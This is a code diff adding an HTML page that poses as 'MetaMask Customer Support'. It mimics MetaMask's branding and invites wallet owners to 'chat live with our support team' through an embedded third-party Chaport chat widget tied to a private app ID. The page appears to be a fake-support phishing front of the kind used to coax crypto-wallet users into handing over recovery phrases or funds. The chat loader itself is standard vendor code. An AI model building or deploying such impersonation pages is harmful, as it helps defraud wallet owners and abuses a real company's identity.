@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>MetaMask Support Chat</title>
+  <style>
+    /* MetaMask-inspired styles for page */
+    body {
+      margin: 0;
+      font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #fff;
+      color: #1C1C1C;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    header {
+      background-color: #F6851B;
+      width: 100%;
+      padding: 1rem;
+      color: white;
+      font-weight: 700;
+      font-size: 1.5rem;
+      text-align: center;
+      box-shadow: 0 3px 6px rgba(246, 133, 27, 0.4);
+    }
+
+    main {
+      max-width: 600px;
+      padding: 2rem;
+      text-align: center;
+    }
+
+    h1 {
+      margin-bottom: 0.5rem;
+    }
+
+    p {
+      font-size: 1.1rem;
+      color: #444;
+    }
+
+    /* Chaport chat button override - may or may not apply due to iframe */
+    .chaport-button {
+      background-color: #F6851B !important;
+      border-radius: 8px !important;
+      box-shadow: 0 0 10px #F6851B80 !important;
+    }
+  </style>
+</head>
+<body>
+  <header>MetaMask Support</header>
+
+  <main>
+    <h1>Welcome to MetaMask Customer Support</h1>
+    <p>Need help with your MetaMask wallet? Chat live with our support team now.</p>
+  </main>
+
+  <!-- Chaport Live Chat code -->
+  <script type="text/javascript">
+    (function(w, d, v3) {
+      w.chaportConfig = { appId: '68555ce6151d56590c7a2b24' };
+      if (w.chaport) return;
+      v3 = w.chaport = {};
+      v3._q = [];
+      v3._l = {};
+      v3.q = function() {
+        v3._q.push(arguments);
+      };
+      v3.on = function(e, fn) {
+        if (!v3._l[e]) v3._l[e] = [];
+        v3._l[e].push(fn);
+      };
+      var s = d.createElement('script');
+      s.type = 'text/javascript';
+      s.async = true;
+      s.src = 'https://app.chaport.com/javascripts/insert.js';
+      var ss = d.getElementsByTagName('script')[0];
+      ss.parentNode.insertBefore(s, ss);
+    })(window, document);
+  </script>
+</body>
+</html>
